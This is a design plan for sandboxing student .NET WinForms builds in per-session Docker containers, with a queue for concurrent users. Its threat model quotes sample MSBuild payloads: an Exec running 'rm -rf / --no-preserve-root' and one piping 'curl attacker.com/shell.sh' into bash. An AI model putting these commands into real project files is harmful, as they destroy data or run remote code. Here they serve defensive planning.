# Implementation Plan: Multi-User Sessions with Security Hardening

## Executive Summary

This document outlines the plan to upgrade CST-150-checker to support **up to 3 concurrent users** with a queue for additional users, while **sandboxing student code** to prevent malicious actions during build and run phases.

**Security goal:** Make it more trouble than it's worth to attack. We're defending against cybersecurity students trying pranks (e.g., `rm -rf /` in build scripts), not nation-state actors.

**Current vulnerabilities addressed:**
1. `dotnet build` runs in the main container - students can execute arbitrary shell commands via MSBuild targets
2. `wine` runs untrusted executables with full host filesystem access
3. Single shared VNC display - all users see the same screen
4. Global state - users overwrite each other's sessions

**Key design decision:** Session containers have network access (`--network bridge`). This simplifies NuGet package handling significantly while remaining secure for our threat model. See "Security Analysis" for why this is acceptable.

---

## Current Architecture Analysis

### What Runs Where Today

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Main Container (winforms-checker)                │
│                                                                     │
│  ┌──────────────┐  ┌──────────────┐  ┌────────────────────────────┐│
│  │   Xvfb :99   │──│   x11vnc     │──│   websockify :6080         ││
│  │              │  │   :5900      │  │   (noVNC)                  ││
│  └──────────────┘  └──────────────┘  └────────────────────────────┘│
│                                                                     │
│  ┌──────────────────────────────────────────────────────────────┐  │
│  │                      Bun Server (server.ts)                   │  │
│  │                                                               │  │
│  │   • dotnet build ./projects/...  ← RUNS HERE (UNSAFE!)       │  │
│  │   • wine app.exe                 ← RUNS HERE (UNSAFE!)       │  │
│  │   • Global state (single user)                                │  │
│  └──────────────────────────────────────────────────────────────┘  │
│                                                                     │
│  Docker socket mounted ─────────► Spawns review containers          │
└─────────────────────────────────────────────────────────────────────┘

                               ▼ spawns sibling container

┌─────────────────────────────────────────────────────────────────────┐
│                Review Container (cst150-review-runner)              │
│                                                                     │
│  • Runs as user 1000 (non-root)                                    │
│  • cap_drop: ALL                                                    │
│  • no-new-privileges                                                │
│  • Resource limits (1GB RAM, 2 CPU)                                 │
│  • Network enabled (needs LLM API)                                  │
│  • READ-ONLY access to student code                                 │
│                                                                     │
│  ✓ ALREADY SECURE                                                   │
└─────────────────────────────────────────────────────────────────────┘
```

### Security Vulnerabilities

#### 1. Build Phase Attack Vectors

**MSBuild Pre/Post Build Events:**
A student's `.csproj` file can contain:
```xml
<Target Name="PreBuild" BeforeTargets="PreBuildEvent">
  <Exec Command="rm -rf / --no-preserve-root" />
</Target>
```

**Directory.Build.props/targets:**
Student can include a `Directory.Build.props` file in their zip that executes on any `dotnet` command:
```xml
<Project>
  <Target Name="Pwn" BeforeTargets="Build">
    <Exec Command="curl attacker.com/shell.sh | bash" />
  </Target>
</Project>
```

**Impact:** Full container compromise, access to docker.sock, ability to spawn privileged containers.

#### 2. Run Phase Attack Vectors

**Wine with host filesystem access:**
The compiled Windows executable runs under Wine with access to:
- `/app/` (all application files)
- `/opt/wine-dotnet/` (Wine prefix)
- `/tmp/` (can write anywhere)
- Environment variables (including any secrets)

**Potential attacks:**
- Read/exfiltrate source code or API keys
- Modify files on disk
- Fork bomb / resource exhaustion
- Network attacks (if container has network access)

#### 3. VNC Sharing Issue

Current state:
- Single Xvfb display `:99` 
- Single x11vnc server on port 5900
- Single websockify on port 6080
- All users connect to the same VNC session

**Impact:** User A sees User B's application window.

---

## Target Architecture

### High-Level Design

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Main Container (Orchestrator Only)               │
│                                                                     │
│  ┌──────────────────────────────────────────────────────────────┐  │
│  │                      Bun Server (server.ts)                   │  │
│  │                                                               │  │
│  │   • Session management (max 3 active, queue others)          │  │
│  │   • Spawns sandbox containers via docker.sock                │  │
│  │   • Proxies VNC connections per session                      │  │
│  │   • NO direct dotnet/wine execution                          │  │
│  └──────────────────────────────────────────────────────────────┘  │
│                                                                     │
│  Docker socket mounted ─────────► Spawns session containers         │
└─────────────────────────────────────────────────────────────────────┘

         spawns 1 container per session (max 3)
                     ▼

┌─────────────────────────────────────────────────────────────────────┐
│              Session Container (cst150-session-runner)              │
│              One per active user session                            │
│                                                                     │
│  ┌──────────────┐  ┌──────────────┐  ┌────────────────────────────┐│
│  │   Xvfb :99   │──│   x11vnc     │──│   websockify :6080         ││
│  │              │  │   :5900      │  │   (internal)               ││
│  └──────────────┘  └──────────────┘  └────────────────────────────┘│
│                                                                     │
│  Security Hardening:                                                │
│  • Runs as non-root user (uid 1000)                                │
│  • cap_drop: ALL                                                    │
│  • no-new-privileges: true                                          │
│  • read_only: true (root filesystem)                                │
│  • Network: bridge (has internet - simplifies NuGet restore)       │
│  • Memory: 2GB limit                                                │
│  • CPU: 2 cores limit                                               │
│  • PIDs: 256 limit                                                  │
│  • Timeout: 10 minute max lifetime                                  │
│                                                                     │
│  Mounts (read-only where possible):                                 │
│  • /project (student code - rw needed for build output)            │
│  • /opt/wine-dotnet (Wine prefix - ro)                              │
│  • /tmp (tmpfs - writable, limited size)                            │
└─────────────────────────────────────────────────────────────────────┘
```

### Session Lifecycle

```
User opens page
       │
       ▼
┌─────────────────┐
│ Acquire Session │◄──── If slots full, enter queue
│                 │      "System experiencing high load,
│ Generate UUID   │       position in queue: N"
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│ User uploads    │
│ project zip     │
└────────┬────────┘
         │
         ▼
┌─────────────────┐     ┌─────────────────────────────┐
│ Spawn session   │────►│ Session Container starts    │
│ container       │     │ with isolated VNC display   │
└────────┬────────┘     └─────────────────────────────┘
         │
         ▼
┌─────────────────┐
│ Build & Run     │     Happens inside sandbox
│ (in container)  │     Main container just proxies status
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│ User clicks     │
│ "Done" or       │
│ timeout (10min) │
│ or disconnects  │
└────────┬────────┘
         │
         ▼
┌─────────────────┐     ┌─────────────────────────────┐
│ Cleanup session │────►│ docker kill + docker rm     │
│ Release slot    │     │ Next queued user promoted   │
└─────────────────┘     └─────────────────────────────┘
```

---

## Implementation Plan

### Phase 1: Session Container Image (`cst150-session-runner`)

**Goal:** Create a Docker image that can safely build and run student WinForms projects.

#### 1.1 Create `session-runner/Dockerfile`

```dockerfile
FROM ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive

# Install Wine, dotnet, display stack (reuse from current Dockerfile)
# ... (Wine 10+, .NET SDK 8.0, Xvfb, x11vnc, websockify, openbox)

# Create non-root user
RUN groupadd -g 1000 student && \
    useradd -u 1000 -g student -m -s /bin/bash student

# Wine prefix needs to be accessible by student user
RUN cp -r /opt/wine-dotnet /home/student/.wine-dotnet && \
    chown -R student:student /home/student/.wine-dotnet

# Create project directory
RUN mkdir -p /project && chown student:student /project

# Create NuGet cache directory (will be tmpfs at runtime)
RUN mkdir -p /home/student/.nuget && chown student:student /home/student/.nuget

# Copy entrypoint
COPY session-entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh

USER student
WORKDIR /project

ENV WINEPREFIX=/home/student/.wine-dotnet
ENV WINEDEBUG=-all
ENV DISPLAY=:99

ENTRYPOINT ["/entrypoint.sh"]
```

**Note:** NuGet packages are NOT pre-cached because containers have network access. This keeps the Dockerfile simple and allows students to use any packages.

#### 1.2 Create `session-runner/session-entrypoint.sh`

```bash
#!/bin/bash
set -e

# Start virtual display
Xvfb :99 -screen 0 800x600x24 &
sleep 1

# Start VNC server
x11vnc -display :99 -nopw -listen 0.0.0.0 -xkb -forever -shared &
sleep 1

# Start websockify for noVNC (on internal port)
websockify 6080 localhost:5900 &

# Signal ready
echo "SESSION_READY"

# Wait for commands via stdin or just keep alive
# The container receives commands via docker exec or volume-based signaling
tail -f /dev/null
```

#### 1.3 Security Hardening Flags (docker run)

When spawning a session container:

```typescript
const sessionContainerArgs = [
  "docker", "run",
  "--name", `session-${sessionId}`,
  "--rm",
  
  // Resource limits
  "--memory", "2g",
  "--memory-swap", "2g",
  "--cpus", "2",
  "--pids-limit", "256",
  "--ulimit", "nofile=4096:4096",
  
  // Security hardening
  "--security-opt", "no-new-privileges:true",
  "--cap-drop", "ALL",
  "--read-only",  // Root filesystem read-only
  
  // Network access allowed (simplifies NuGet restore, acceptable for threat model)
  "--network", "bridge",
  
  // Run as non-root
  "--user", "1000:1000",
  
  // Writable areas (tmpfs)
  "--tmpfs", "/tmp:size=512m,mode=1777",
  "--tmpfs", "/home/student/.nuget:size=256m,mode=755",  // NuGet cache
  
  // Mount project files (the only way to get student code in)
  "-v", `${projectVolume}:/project:rw`,
  
  // Mount Wine prefix (read-only, pre-configured)
  "-v", "cst150-wine-prefix:/home/student/.wine-dotnet:ro",
  
  // Expose VNC port (mapped dynamically)
  "-p", `${vncPort}:6080`,
  
  // Image
  "cst150-session-runner:latest"
];
```

**Critical security notes:**
- `--network bridge`: Container has internet access (needed for NuGet, acceptable for threat model - see Security Analysis)
- `--read-only`: Cannot modify container filesystem (only tmpfs and /project)
- `--cap-drop ALL`: No Linux capabilities (can't mount, can't access raw sockets, etc.)
- `--user 1000:1000`: Non-root, can't escalate
- No docker.sock: Cannot spawn other containers (this is the key isolation)

### Phase 2: Session Management in Server

#### 2.1 Session State Structure

```typescript
interface Session {
  id: string;                    // UUID
  createdAt: Date;
  lastHeartbeat: Date;
  
  // Container info
  containerId: string | null;
  containerName: string;
  vncPort: number;               // Dynamically allocated (6081, 6082, 6083)
  
  // Project state
  status: 'pending' | 'starting' | 'ready' | 'building' | 'built' | 'running' | 'error';
  projectName: string | null;
  buildOutput: string;
  runOutput: string;
  errorMessage: string | null;
  
  // Assignment
  selectedAssignmentPartId: number | null;
}

interface SessionManager {
  activeSessions: Map<string, Session>;  // Max 3
  queue: string[];                        // Session IDs waiting
  
  // Callbacks per session for SSE
  sessionCallbacks: Map<string, SessionCallback[]>;
}
```

#### 2.2 Session Acquisition Flow

```typescript
app.post("/api/session/acquire", async (c) => {
  const sessionId = crypto.randomUUID();
  
  if (sessionManager.activeSessions.size >= MAX_CONCURRENT_SESSIONS) {
    // Add to queue
    sessionManager.queue.push(sessionId);
    const position = sessionManager.queue.indexOf(sessionId) + 1;
    
    return c.json({
      status: 'queued',
      sessionId,
      queuePosition: position,
      message: `System experiencing high load. Position in queue: ${position}`
    });
  }
  
  // Allocate VNC port
  const vncPort = allocateVncPort();  // Returns 6081, 6082, or 6083
  
  // Create session
  const session: Session = {
    id: sessionId,
    createdAt: new Date(),
    lastHeartbeat: new Date(),
    containerId: null,
    containerName: `session-${sessionId.slice(0, 8)}`,
    vncPort,
    status: 'pending',
    projectName: null,
    buildOutput: '',
    runOutput: '',
    errorMessage: null,
    selectedAssignmentPartId: null,
  };
  
  sessionManager.activeSessions.set(sessionId, session);
  
  return c.json({
    status: 'acquired',
    sessionId,
    vncPort,
  });
});
```

#### 2.3 Heartbeat & Timeout

```typescript
// Client sends heartbeat every 10 seconds
app.post("/api/session/:sessionId/heartbeat", (c) => {
  const session = sessionManager.activeSessions.get(c.req.param('sessionId'));
  if (!session) {
    return c.json({ error: 'Session not found' }, 404);
  }
  session.lastHeartbeat = new Date();
  return c.json({ ok: true });
});

// Background cleanup task (runs every 30 seconds)
setInterval(() => {
  const now = Date.now();
  
  for (const [sessionId, session] of sessionManager.activeSessions) {
    const timeSinceHeartbeat = now - session.lastHeartbeat.getTime();
    const sessionAge = now - session.createdAt.getTime();
    
    // Kill if no heartbeat for 60 seconds OR session older than 10 minutes
    if (timeSinceHeartbeat > 60_000 || sessionAge > 10 * 60_000) {
      cleanupSession(sessionId, 'timeout');
    }
  }
}, 30_000);
```

#### 2.4 Release Session (user clicks "Done" or closes page)

```typescript
app.post("/api/session/:sessionId/release", async (c) => {
  await cleanupSession(c.req.param('sessionId'), 'user_released');
  return c.json({ ok: true });
});

async function cleanupSession(sessionId: string, reason: string) {
  const session = sessionManager.activeSessions.get(sessionId);
  if (!session) return;
  
  console.log(`Cleaning up session ${sessionId}: ${reason}`);
  
  // Kill the container
  if (session.containerId) {
    try {
      await spawn({ cmd: ["docker", "kill", session.containerName] }).exited;
      await spawn({ cmd: ["docker", "rm", "-f", session.containerName] }).exited;
    } catch { /* ignore */ }
  }
  
  // Clean up project files
  const projectVolume = `session-${sessionId}`;
  await spawn({ cmd: ["docker", "volume", "rm", "-f", projectVolume] }).exited;
  
  // Remove from active sessions
  sessionManager.activeSessions.delete(sessionId);
  
  // Release VNC port
  releaseVncPort(session.vncPort);
  
  // Promote next queued user
  if (sessionManager.queue.length > 0) {
    const nextSessionId = sessionManager.queue.shift()!;
    promoteFromQueue(nextSessionId);
  }
}
```

### Phase 3: VNC Port Management & Proxying

#### 3.1 Port Allocation

```typescript
const VNC_PORT_POOL = [6081, 6082, 6083];  // 3 ports for 3 concurrent sessions
const usedPorts = new Set<number>();

function allocateVncPort(): number {
  for (const port of VNC_PORT_POOL) {
    if (!usedPorts.has(port)) {
      usedPorts.add(port);
      return port;
    }
  }
  throw new Error("No VNC ports available");
}

function releaseVncPort(port: number) {
  usedPorts.delete(port);
}
```

#### 3.2 Client VNC URL

```typescript
// Frontend API
getVncUrl(sessionId: string): string {
  // The main container proxies VNC based on session
  return `${window.location.protocol}//${window.location.hostname}:${vncPort}/vnc.html?autoconnect=true`;
}
```

**Alternative approach - Session-based proxy:**

Instead of exposing multiple ports, the main container could proxy VNC:
- Single port 6080 on main container
- Client connects with session token
- Server proxies to correct session container's VNC

This is more complex but cleaner for clients. For MVP, exposing 3 ports (6081-6083) is simpler.

### Phase 4: Build & Run Inside Session Container

#### 4.1 Upload Handling

```typescript
app.post("/api/session/:sessionId/upload", async (c) => {
  const session = getSession(c.req.param('sessionId'));
  
  // Create per-session Docker volume for project files
  const volumeName = `session-${session.id}`;
  await spawn({ cmd: ["docker", "volume", "create", volumeName] }).exited;
  
  // Extract zip to a temp location, then copy to volume
  // (Similar to current upload logic but to a volume)
  
  // Spawn the session container if not already running
  if (!session.containerId) {
    await spawnSessionContainer(session);
  }
  
  session.status = 'ready';
  session.projectName = extractedProjectName;
  emitSessionUpdate(session);
  
  return c.json({ success: true });
});
```

#### 4.2 Spawn Session Container

```typescript
async function spawnSessionContainer(session: Session) {
  const volumeName = `session-${session.id}`;
  
  const proc = spawn({
    cmd: [
      "docker", "run", "-d",
      "--name", session.containerName,
      
      // All security flags from Phase 1.3
      "--memory", "2g",
      "--cpus", "2",
      "--pids-limit", "256",
      "--security-opt", "no-new-privileges:true",
      "--cap-drop", "ALL",
      "--network", "bridge",  // Allow network for NuGet
      "--user", "1000:1000",
      "--read-only",
      "--tmpfs", "/tmp:size=512m,mode=1777",
      "--tmpfs", "/home/student/.nuget:size=256m,mode=755",
      
      // Mount project volume
      "-v", `${volumeName}:/project:rw`,
      
      // Mount Wine prefix (shared, read-only)
      "-v", "cst150-wine-prefix:/home/student/.wine-dotnet:ro",
      
      // Expose VNC
      "-p", `${session.vncPort}:6080`,
      
      "cst150-session-runner:latest"
    ],
    stdout: "pipe",
  });
  
  const output = await new Response(proc.stdout).text();
  session.containerId = output.trim();
  
  await proc.exited;
  
  // Wait for container to be ready
  await waitForContainerReady(session);
}
```

#### 4.3 Execute Build & Run via docker exec

```typescript
app.post("/api/session/:sessionId/build", async (c) => {
  const session = getSession(c.req.param('sessionId'));
  session.status = 'building';
  session.buildOutput = '';
  emitSessionUpdate(session);
  
  // Run dotnet build inside the session container
  const buildProc = spawn({
    cmd: [
      "docker", "exec",
      session.containerName,
      "dotnet", "build", "/project/Project.csproj",
      "--configuration", "Release",
      "--runtime", "win-x64",
      "--self-contained", "true",
      "-p:EnableWindowsTargeting=true",
    ],
    stdout: "pipe",
    stderr: "pipe",
  });
  
  // Stream output back to client
  streamOutput(buildProc, session, 'build');
  
  await buildProc.exited;
  
  if (buildProc.exitCode === 0) {
    session.status = 'built';
  } else {
    session.status = 'error';
    session.errorMessage = 'Build failed';
  }
  emitSessionUpdate(session);
});

app.post("/api/session/:sessionId/run", async (c) => {
  const session = getSession(c.req.param('sessionId'));
  session.status = 'running';
  emitSessionUpdate(session);
  
  // Run the application with Wine inside the container
  // The container already has Xvfb + x11vnc running
  spawn({
    cmd: [
      "docker", "exec", "-d",  // detached
      session.containerName,
      "wine", "/project/bin/Release/net8.0-windows/win-x64/App.exe"
    ],
  });
  
  return c.json({ success: true });
});
```

### Phase 5: Frontend Changes

#### 5.1 Session Initialization

```typescript
// On app load
useEffect(() => {
  const initSession = async () => {
    const result = await api.acquireSession();
    
    if (result.status === 'queued') {
      setQueuePosition(result.queuePosition);
      // Poll for promotion
      pollForPromotion(result.sessionId);
    } else {
      setSessionId(result.sessionId);
      setVncPort(result.vncPort);
    }
  };
  
  initSession();
  
  // Cleanup on unmount / page close
  return () => {
    api.releaseSession(sessionId);
  };
}, []);
```

#### 5.2 Heartbeat

```typescript
useEffect(() => {
  if (!sessionId) return;
  
  const interval = setInterval(() => {
    api.heartbeat(sessionId);
  }, 10_000);
  
  return () => clearInterval(interval);
}, [sessionId]);
```

#### 5.3 Queue Display

```tsx
if (queuePosition > 0) {
  return (
    <div className="flex flex-col items-center justify-center min-h-screen">
      <div className="text-center p-8 bg-slate-800 rounded-lg">
        <Loader2 className="w-12 h-12 animate-spin mx-auto mb-4 text-amber-400" />
        <h2 className="text-xl font-semibold text-white mb-2">
          System Experiencing High Load
        </h2>
        <p className="text-slate-400 mb-4">
          Please wait while we prepare your session
        </p>
        <div className="text-4xl font-bold text-amber-400">
          Position in queue: {queuePosition}
        </div>
        <p className="text-sm text-slate-500 mt-4">
          Estimated wait: ~{queuePosition * 5} minutes
        </p>
      </div>
    </div>
  );
}
```

#### 5.4 Page Close Handler

```typescript
useEffect(() => {
  const handleBeforeUnload = () => {
    // Fire-and-forget session release
    navigator.sendBeacon(`/api/session/${sessionId}/release`);
  };
  
  window.addEventListener('beforeunload', handleBeforeUnload);
  return () => window.removeEventListener('beforeunload', handleBeforeUnload);
}, [sessionId]);
```

### Phase 6: Wine Prefix Sharing

Create a shared, read-only Wine prefix volume so each session container doesn't need its own copy:

```bash
# One-time setup during image build or first start
docker volume create cst150-wine-prefix

# Copy Wine prefix to volume
docker run --rm \
  -v cst150-wine-prefix:/dest \
  cst150-session-runner:latest \
  cp -a /home/student/.wine-dotnet/. /dest/
```

Then session containers mount it read-only:
```
-v cst150-wine-prefix:/home/student/.wine-dotnet:ro
```

**Note:** NuGet package pre-caching is NOT required since session containers have network access. This significantly simplifies the Dockerfile and allows students to use any NuGet packages.

---

## Security Analysis

### Threat Model

**Goal:** Make it more trouble than it's worth to attack. We're defending against bored cybersecurity students trying pranks, not nation-state actors.

| Threat | Mitigation |
|--------|------------|
| **Malicious MSBuild targets** | Build runs in isolated container, no host access, no docker.sock |
| **rm -rf /** | Container runs as non-root, filesystem is read-only except /project and /tmp |
| **Fork bomb** | `--pids-limit 256` limits process count |
| **Memory exhaustion** | `--memory 2g` hard limit |
| **CPU exhaustion** | `--cpus 2` limit, 10-minute session timeout |
| **Container escape** | `--cap-drop ALL`, `--security-opt no-new-privileges`, no docker.sock |
| **Access other users' data** | Separate containers, separate volumes per session |
| **Crypto mining** | CPU limit + 10-min timeout makes it economically worthless |
| **Persistent backdoor** | Container is destroyed after session, volumes deleted |

### Why Network Access is Acceptable

We allow `--network bridge` (internet access) because:

1. **What network enables for an attacker:**
   - Exfiltrate data... but it's their own code they uploaded
   - Download malware... but it can't persist (container destroyed after 10 min)
   - Call external APIs... but to what end? They have no valuable data
   - Crypto mining... but 10-min timeout + 2 CPU limit makes it worthless

2. **What network does NOT enable:**
   - ❌ Escape the container (still sandboxed)
   - ❌ Access the host (still no docker.sock, cap-drop ALL)
   - ❌ Affect other users (still separate containers)
   - ❌ Persist beyond session (container destroyed)

3. **The huge simplification:**
   - No need to pre-cache NuGet packages (saves hours of setup)
   - Students can use any NuGet packages they want
   - Way fewer edge cases ("why won't my package restore?")

**Bottom line:** The real security comes from container isolation (no docker.sock, cap-drop ALL, non-root, read-only FS), not network isolation.

### What Attackers CAN Still Do

1. **Crash their own session** - Acceptable, only affects them
2. **Waste their 10-minute slot** - Acceptable, limited impact
3. **Make outbound network requests** - Acceptable, they have no valuable data to exfiltrate
4. **Fill up /tmp or /project** - Limited by tmpfs size (512MB) and timeout
5. **See error messages from their malicious code** - Acceptable, it's their code

### What Attackers CANNOT Do

1. ❌ Access the host filesystem
2. ❌ Access other users' sessions
3. ❌ Spawn other containers (no docker.sock)
4. ❌ Escalate privileges (non-root, no-new-privileges, cap-drop ALL)
5. ❌ Persist beyond their session (container + volume destroyed)
6. ❌ Affect the main orchestrator container
7. ❌ Access API keys or secrets (none in session container)
8. ❌ Modify system files (read-only root filesystem)

---

## Implementation Order

### MVP (Recommended First)

1. **Create `session-runner` Docker image** (0.5-1 day)
   - Copy Wine/dotnet/Xvfb/x11vnc setup from main Dockerfile
   - Create non-root user
   - Add session-entrypoint.sh
   - Test locally (no NuGet pre-caching needed since we allow network!)

2. **Session management in server.ts** (1 day)
   - Session acquisition/release
   - Port allocation (6081, 6082, 6083)
   - Container spawning with security flags
   - Heartbeat/timeout cleanup

3. **Move build/run to docker exec** (0.5 day)
   - Redirect dotnet/wine commands to session container
   - Stream output back via SSE

4. **Frontend session handling** (0.5 day)
   - Acquire session on load
   - Heartbeat interval (10 sec)
   - Release on page close (sendBeacon)
   - Queue UI

5. **Testing & hardening** (0.5-1 day)
   - Test concurrent sessions
   - Test security (try malicious .csproj)
   - Test timeout/cleanup
   - Test queue promotion

**Total: ~3-4 days**

**Simplification from allowing network:** No NuGet pre-caching phase, simpler Dockerfile, fewer edge cases to debug.

### Future Enhancements (Post-MVP)

- VNC proxying through single port (cleaner than 3 exposed ports)
- Session resume on page refresh (store session ID in localStorage)
- Admin dashboard showing active sessions
- Configurable max sessions and timeout
- Rate limiting per IP

---

## File Changes Summary

### New Files

```
session-runner/
├── Dockerfile              # Session container image
├── session-entrypoint.sh   # Container entrypoint
└── build.sh               # Helper to build image

src/
├── session-manager.ts      # Session state management
└── container-runner.ts     # Docker container operations
```

### Modified Files

```
src/server.ts              # Major refactor: add session APIs, remove direct dotnet/wine
docker-compose.yml         # Add wine-prefix volume, remove direct Wine deps from main
Dockerfile                 # Simplify: remove Wine, keep just orchestrator deps
frontend/src/lib/api.ts    # Add session APIs
frontend/src/App.tsx       # Add session initialization
frontend/src/hooks/useWorkflow.ts  # Add session context
frontend/src/components/   # Add queue UI, pass session to VNC URL
```

### Removed from Main Container

- Wine (all wine-* packages)
- Xvfb, x11vnc, websockify
- .NET Desktop Runtime in Wine prefix
- openbox

The main container becomes a lightweight orchestrator (~500MB instead of ~4GB).

---

## Testing Checklist

### Functional Tests

- [ ] Single user can upload, build, run, review
- [ ] VNC shows correct application
- [ ] Build output streams correctly
- [ ] Session releases on "Done" click
- [ ] Session releases on page close
- [ ] Session releases on timeout

### Concurrency Tests

- [ ] 3 users can work simultaneously
- [ ] 4th user sees queue message
- [ ] Queue position updates when slot opens
- [ ] Queued user promoted correctly

### Security Tests

- [ ] Malicious .csproj with `<Exec Command="rm -rf /">` is contained (doesn't affect host)
- [ ] Fork bomb is limited (check pids-limit works)
- [ ] Container cannot access other sessions' volumes
- [ ] Container cannot read main orchestrator files
- [ ] Container cannot spawn sibling containers (no docker.sock access)
- [ ] Session container destroyed after timeout

### Cleanup Tests

- [ ] Container removed after session ends
- [ ] Volume removed after session ends
- [ ] VNC port released after session ends
- [ ] No orphaned containers after timeout

---

## Rollback Plan

If issues arise, the system can be temporarily reverted to single-user mode:
1. Set `MAX_CONCURRENT_SESSIONS = 1`
2. Fall back to current in-container build/run (less secure but functional)

This allows partial deployment while fixing issues.
